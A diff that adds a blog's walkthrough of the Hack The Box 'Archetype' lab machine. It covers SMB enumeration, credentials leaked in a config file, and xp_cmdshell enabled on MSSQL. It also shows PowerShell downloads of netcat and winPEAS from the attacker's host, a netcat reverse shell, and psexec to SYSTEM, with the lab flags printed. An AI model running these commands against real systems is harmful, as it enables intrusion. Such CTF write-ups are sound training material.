@@ -27,7 +27,7 @@ In this blog, I will perform an analysis of each level and give a walkthrough fo
 
 ### Tier 2
 
- 1. ✗ [Level 1: Archtype](#level-1-archtype) 
+ 1. ✓ [Level 1: Archtype](#level-1-archtype) 
  2. ✗ [Level 2: Oopsie](#level-2-oopsie) 
  3. ✗ [Level 3: Vaccine](#level-3-vaccine)
  4. ✗ [Level 4: Unified](#level-4-unified) 
@@ -3158,7 +3158,7 @@ smb: \>
 
 
 ```
-We see here mostly uninteresting files, and there is also no administrative access. It would be a good idea at this point to iterate to the next share.
+We see here mostly system files, however no flag is found.
 
 Trying the remaining shares:
 
@@ -3276,5 +3276,538 @@ f751c19eda8f61ce81827e6930a1f40c
 
 Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the service, a consequence of the server administrator having poorly configured the login credentials.
 
+
+[Table of Contents](#table-of-contents)
+
+## Tier 2
+
+## Level 1: Archtype
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	IP Address   |    	10.129.95.187   | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+First we can try to see if we can make contact with the machine with a ping request.
+
+```
+ping {ip address}
+```
+The results from the ping are:
+
+```
+└─$ ping 10.129.95.187      
+        
+PING 10.129.95.187 (10.129.95.187) 56(84) bytes of data.
+64 bytes from 10.129.95.187: icmp_seq=1 ttl=127 time=13.0 ms
+64 bytes from 10.129.95.187: icmp_seq=2 ttl=127 time=9.99 ms
+64 bytes from 10.129.95.187: icmp_seq=3 ttl=127 time=8.31 ms
+64 bytes from 10.129.95.187: icmp_seq=4 ttl=127 time=6.77 ms
+
+--- 10.129.95.187 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 6.773/9.510/12.973/2.300 ms
+
+
+```
+As we can see, we made a connection with the host. 
+
+Next, we can try using nmap to see if there are any ports that can be exploited.
+
+```
+nmap -p- --min-rate 3000 -sC -sV {ip address}
+```
+
+Where:
+
+```
+-p-: scans ALL ports
+--min-rate <number>: Send packets no slower than <number> per second
+-sC: equivalent to --script=default
+-sV: probe open ports to determine service/version info
+-O: operating system information
+```
+The results of nmap are:
+
+```
+└─$ sudo nmap -p- --min-rate 3000 -sC -sV -O  10.129.95.187
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 16:52 EDT
+Nmap scan report for 10.129.95.187
+Host is up (0.0092s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+|_ssl-date: 2022-07-28T20:54:15+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2022-07-28T20:50:02
+|_Not valid after:  2052-07-28T20:50:02
+| ms-sql-ntlm-info: 
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=7/28%OT=135%CT=1%CU=43192%PV=Y%DS=2%DC=I%G=Y%TM=62E2F7
+OS:77%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS
+OS:=U)OPS(O1=M539NW8NNS%O2=M539NW8NNS%O3=M539NW8%O4=M539NW8NNS%O5=M539NW8NN
+OS:S%O6=M539NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y
+OS:%DF=Y%T=80%W=FFFF%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
+OS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%
+OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD
+OS:=Z)
+
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-07-28T13:54:07-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| ms-sql-info: 
+|   10.129.95.187:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| smb2-time: 
+|   date: 2022-07-28T20:54:10
+|_  start_date: N/A
+|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 85.15 seconds
+
+
+```
+Our scan shows quite a few ports the can be explored. Two of the more interesting ones are port 445 (SMB) and 1433 (MYSQL DB)
+
+We can start by trying to establish connection using smbclient:
+
+```
+smbclient -L {ip address}
+```
+ 
+The results of using smbclient are:
+
+```
+└─$ smbclient -L 10.129.95.187   
+       
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+We can see here all of the visible share names listed. A great starting point is to try to connect with each of these shares.
+
+In analyzing each share, we notice that backups does not require administrative privileges. This would be a great first option:
+
+
+```
+└─$ smbclient \\\\10.129.95.187\\backups
+
+Password for [WORKGROUP\kali]:
+
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Jan 20 07:20:57 2020
+  ..                                  D        0  Mon Jan 20 07:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
+
+                5056511 blocks of size 4096. 2602932 blocks available
+smb: \> 
+
+```
+Gaining access, we notice one file of interest, ```prod.dtsConfig```. We can start by downloading and analyzing it:
+
+```
+smb: \> get prod.dtsConfig
+
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+
+└─$ cat prod.dtsConfig
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>  
+
+```
+
+In scanning the file, we notice two bits of important information:
+
+```
+User ID= ARCHETYPE\sql_svc
+Password= M3g4c0rp123
+```
+We can save these credentials for now, as they may come in handy later on.
+
+Since we have exhausted our options with the SMB share, we can try using out credentials to log into the MYSQL database. We can use thee mssqlclient.py script to make a connection:
+
+```
+└─$ python /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
+
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+
+SQL> 
+
+```
+We can see here the credentials we found earlier were a success into gaining DB access. We can see our options:
+
+```
+SQL> help
+
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+     
+SQL> 
+
+
+```
+It would be a great idea to use a command shell, we can get access to the system. First enabling it:
+
+```
+SQL> enable_xp_cmdshell
+
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL> RECONFIGURE
+
+```
+Now, let's run the shell:
+
+```
+SQL> xp_cmdshell whoami
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+archetype\sql_svc                                                                  
+
+NULL                                                                               
+
+SQL> 
+```
+We can see two things here:
+
+ 1. We do not have root access
+ 2. The command shell is not persistent so we would need to chain commands to be able to do anything useful
+
+One idea is to install netcat on this remote machine in order to get access to a reverse shell persistent terminal. 
+
+First, let's run host a python server on our machine:
+
+```
+└─$ sudo python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Next, let's jump back to our SQL terminal and download the netcat executable from our machine:
+
+```
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.136/nc64.exe -outfile nc64.exe"
+
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+NULL 
+ 
+
+10.129.95.187 - - [28/Jul/2022 17:40:48] "GET /nc64.exe HTTP/1.1" 200 -
+```
+
+Since it successfully downloaded, let's run the executable after we start netcat on out host machine:
+
+```
+└─$ sudo nc -lvnp 443
+
+listening on [any] 443 ...
+
+```
+
+```
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ./nc64.exe -e cmd.exe 10.10.14.136 443"
+```
+
+```
+connect to [10.10.14.136] from (UNKNOWN) [10.129.95.187] 49678
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\sql_svc\Downloads>
+```
+It worked! We now have full console access with user privileges.
+
+We can browse around to see if there are any flags for this user.
+
+```
+C:\Users\sql_svc\Downloads>cd ..
+cd ..
+
+C:\Users\sql_svc>dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\sql_svc
+
+01/20/2020  06:01 AM    <DIR>          .
+01/20/2020  06:01 AM    <DIR>          ..
+01/20/2020  06:01 AM    <DIR>          3D Objects
+01/20/2020  06:01 AM    <DIR>          Contacts
+01/20/2020  06:42 AM    <DIR>          Desktop
+01/20/2020  06:01 AM    <DIR>          Documents
+07/28/2022  02:40 PM    <DIR>          Downloads
+01/20/2020  06:01 AM    <DIR>          Favorites
+01/20/2020  06:01 AM    <DIR>          Links
+01/20/2020  06:01 AM    <DIR>          Music
+01/20/2020  06:01 AM    <DIR>          Pictures
+01/20/2020  06:01 AM    <DIR>          Saved Games
+01/20/2020  06:01 AM    <DIR>          Searches
+01/20/2020  06:01 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  10,710,724,608 bytes free
+
+C:\Users\sql_svc>cd desktop
+
+C:\Users\sql_svc\Desktop>dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\sql_svc\Desktop
+
+01/20/2020  06:42 AM    <DIR>          .
+01/20/2020  06:42 AM    <DIR>          ..
+02/25/2020  07:37 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,710,724,608 bytes free
+
+C:\Users\sql_svc\Desktop>type user.txt
+
+type user.txt
+
+3e7b102e78218e935bf3f4951fec21a3
+
+```
+We cam see here we have our fifteenth flag! This level makes it clear that there is another flag to grab. 
+
+We can try to perform a Windows privilege escalation in order to access the other flag.
+
+One tool we could use is winPEAS. Since we still have our python server running, lets pass the exe over to the host machine to run:
+
+```
+C:\Users\sql_svc\Desktop>powershell
+
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\sql_svc\Desktop> wget http://10.10.14.136/winPEASany_ofs.exe -outfile winPEASany_ofs.exe
+wget http://10.10.14.136/winPEASany_ofs.exe -outfile winPEASany_ofs.exe
+
+PS C:\Users\sql_svc\Desktop> ls
+
+    Directory: C:\Users\sql_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        2/25/2020   6:37 AM             32 user.txt                                                              
+-a----        7/28/2022   3:00 PM        1804288 winPEASany_ofs.exe                                                    
+
+PS C:\Users\sql_svc\Desktop> ./winPEASany_ofs.exe 
+```
+We see an interesting file:
+
+```
+PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS history size: 79B
+
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+```
+It appears we now have the credentials for the administrator!
+
+```
+USERNAME: administrator 
+PASSWORD: MEGACORP_4dm1n!!
+```
+We can now use these credentials to get into SMB, except now as an ADMIN:
+
+```
+└─$ python /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.95.187
+   
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+Password: MEGACORP_4dm1n!!
+
+[*] Requesting shares on 10.129.95.187.....
+[*] Found writable share ADMIN$
+[*] Uploading file CcqGgESI.exe
+[*] Opening SVCManager on 10.129.95.187.....
+[*] Creating service dDwb on 10.129.95.187.....
+[*] Starting service dDwb.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+Now to grab our sixteenth flag!
+
+```
+C:\Windows\system32> cd ..
+ 
+
+C:\Windows> cd ..
+ 
+C:\> cd users
+ 
+C:\Users> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users
+
+01/19/2020  04:10 PM    <DIR>          .
+01/19/2020  04:10 PM    <DIR>          ..
+01/19/2020  11:39 PM    <DIR>          Administrator
+01/19/2020  11:39 PM    <DIR>          Public
+01/20/2020  06:01 AM    <DIR>          sql_svc
+               0 File(s)              0 bytes
+               5 Dir(s)  10,703,216,640 bytes free
+
+C:\Users> cd Administrator
+ 
+C:\Users\Administrator> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\Administrator
+
+01/19/2020  11:39 PM    <DIR>          .
+01/19/2020  11:39 PM    <DIR>          ..
+07/27/2021  02:30 AM    <DIR>          3D Objects
+07/27/2021  02:30 AM    <DIR>          Contacts
+07/27/2021  02:30 AM    <DIR>          Desktop
+07/27/2021  02:30 AM    <DIR>          Documents
+07/27/2021  02:30 AM    <DIR>          Downloads
+07/27/2021  02:30 AM    <DIR>          Favorites
+07/27/2021  02:30 AM    <DIR>          Links
+07/27/2021  02:30 AM    <DIR>          Music
+07/27/2021  02:30 AM    <DIR>          Pictures
+07/27/2021  02:30 AM    <DIR>          Saved Games
+07/27/2021  02:30 AM    <DIR>          Searches
+07/27/2021  02:30 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  10,703,216,640 bytes free
+
+C:\Users\Administrator> cd Desktop
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/27/2021  02:30 AM    <DIR>          .
+07/27/2021  02:30 AM    <DIR>          ..
+02/25/2020  07:36 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,703,216,640 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt
+
+b91ccec3305e98240082d4474b848528
+```
+
+
+## Conclusions - Level 1 Archtype
+
+| # | 	Tools 	| Description |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+| 2 | 	winPEAS   |    	Windows  privilege escalation  |
+| 3 | 	netcat   |    	host listening to establish a reverse shell |  
+| 4 | 	MYSQLCLIENT.PY    |    	Logging into MYSQL database | 
+| 5 | 	PSEXEC.PY    |    	Administrative full shell acess | 
+
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
+| 1 | 	Insecure Password Storage  |    	X |  |  |  |
+
+Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the users credentials from a stored file. We then used those credentials to log into MYSQL, where were able access a command line execution. Using netcat, we were then able to establish a reverse shell in order to find the user flag. We then used winPEAS, where we found the ADMIN credentials. Finally, we used those credentials in PSEXEC.PY in order to have full administrative access and grab the admin flag.
 
 [Table of Contents](#table-of-contents)
